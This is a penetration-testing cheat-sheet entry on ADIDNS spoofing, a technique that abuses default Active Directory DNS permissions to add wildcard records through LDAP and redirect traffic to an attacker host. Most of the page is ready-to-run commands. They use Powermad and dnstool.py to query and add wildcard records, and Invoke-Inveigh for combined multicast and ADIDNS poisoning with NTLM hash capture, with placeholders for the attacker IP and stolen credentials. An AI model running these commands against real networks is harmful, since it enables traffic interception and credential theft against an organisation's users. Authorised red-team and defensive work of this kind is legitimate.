---
technique: ADIDNS Spoofing
category: mitm
targets: Active Directory Integrated DNS
protocols: DNS, LDAP
remote_capable: true
tags: mitm dns adidns poisoning wildcard ldap ntlm-relay
---

# ADIDNS Spoofing

Active Directory Integrated DNS (ADIDNS) zone DACLs allow regular domain users to create DNS child objects by default. Attackers can create wildcard records or specific DNS entries via LDAP to redirect traffic to a rogue host, enabling MiTM scenarios and NTLM relay. Wildcard records function similarly to LLMNR/NBT-NS spoofing but at the DNS layer.

## Windows

Powermad and Inveigh cover static wildcard injection and dynamic ADIDNS-aware poisoning respectively.

### Powermad (query)

#powershell #recon

Query the current value of a DNS node's record attribute to inspect existing entries.

```powershell title:"Query DNS node attribute with Powermad"
Get-ADIDNSNodeAttribute -Node * -Attribute DNSRecord
```
<!-- cheat -->

### Powermad (add wildcard)

#powershell #wildcard

Create a wildcard DNS record pointing to the attacker's IP to capture all unresolved name queries.

```powershell title:"Create wildcard ADIDNS record with Powermad"
New-ADIDNSNode -Tombstone -Verbose -Node * -Data "$lhost"
```
<!-- cheat
import tun_ip
-->

### Invoke-Inveigh (dynamic ADIDNS)

#powershell #dynamic #capture

Combine LLMNR/NBT-NS/mDNS poisoning with dynamic ADIDNS injection and NTLM hash capture.

```powershell title:"Dynamic ADIDNS spoofing combined with multicast poisoning using Inveigh"
Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y
```
<!-- cheat -->

## Linux

dnstool.py provides LDAP-based DNS record manipulation from Linux.

### dnstool (query)

#python #recon #ldap

Query an existing DNS node record to check for current entries before adding a record.

```sh title:"Query ADIDNS wildcard record with dnstool"
dnstool.py -u "$domain"'\'$user -p "$pass" --record '*' --action query "$rhost_ip"
```
<!-- cheat
import domain_ip
import users
import passwords
var dc_ip
-->

### dnstool (add wildcard)

#python #wildcard #ldap

Add a wildcard DNS record pointing to the attacker's IP to redirect all unresolved DNS queries.

```sh title:"Add wildcard ADIDNS record with dnstool"
dnstool.py -u "$domain"'\'$user -p "$pass" --record '*' --action add --data "$lhost" "$rhost_ip"
```
<!-- cheat
import domain_ip
import users
import passwords
import tun_ip
var dc_ip
-->
